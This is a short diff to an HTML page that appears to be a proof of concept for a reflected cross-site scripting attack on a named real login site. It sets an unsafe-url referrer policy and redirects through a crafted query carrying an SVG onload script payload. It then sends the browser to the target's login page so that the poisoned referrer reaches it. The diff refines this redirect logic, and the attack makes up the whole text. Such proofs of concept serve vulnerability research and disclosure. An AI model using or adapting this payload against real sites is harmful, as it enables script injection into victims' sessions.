@@ -2,10 +2,11 @@
   <head>
     <meta name="referrer" content="unsafe-url">
     <script>
-      if (window.location.hash != 'ready') {
+      if (window.location.hash != '#ready') {
         window.location = '?a=">%20<svg/onload=alert`xss`><a%20#ready';
+      } else {
+        window.location = 'https://member.housefun.com.tw/login/login.aspx';
       }
     </script>
-    <meta http-equiv="refresh" content="0;url=https://member.housefun.com.tw/login/login.aspx" />
   </head>
 </html>
